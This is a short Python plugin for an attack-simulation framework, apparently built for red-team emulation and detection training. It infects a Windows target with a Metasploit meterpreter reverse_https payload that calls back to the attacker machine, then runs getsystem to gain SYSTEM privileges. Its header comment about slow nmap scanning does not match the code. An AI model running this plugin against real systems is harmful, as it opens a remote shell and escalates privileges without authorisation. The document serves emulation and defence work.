#!/usr/bin/env python3

# A plugin to nmap targets slow motion, to evade sensors

from plugins.base.attack import AttackPlugin, Requirement
import socket


class MetasploitGetsystemPlugin(AttackPlugin):

    # Boilerplate
    name = "metasploit_getsystem"
    description = "Privilege elevation via metasploit getsystem"
    ttp = "???"
    references = ["https://docs.rapid7.com/metasploit/meterpreter-getsystem/"]

    required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    requirements = [Requirement.METASPLOIT]

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets, ip addresses will do
        """

        self.attack_logger.start_narration("A metasploit command like that is used to get system privileges for the next attack step.")
        res = ""
        payload_type = "windows/x64/meterpreter/reverse_https"
        payload_name = "babymetal.exe"
        target = self.targets[0]

        ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())

        self.metasploit.smart_infect(target,
                                     payload=payload_type,
                                     architecture="x64",
                                     platform="windows",
                                     lhost=ip,
                                     format="exe",
                                     outfile=payload_name)

        # TODO: https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/priv/elevate.c#L70

        self.metasploit.getsystem(target,
                                  variant=self.conf['variant'],
                                  situation_description="This is an example standalone attack step. In real world attacks there would be events before and after",
                                  countermeasure="Observe how pipes are used. Take steps before (gaining access) and after (abusing those new privileges) into account for detection."
                                  )

        return res
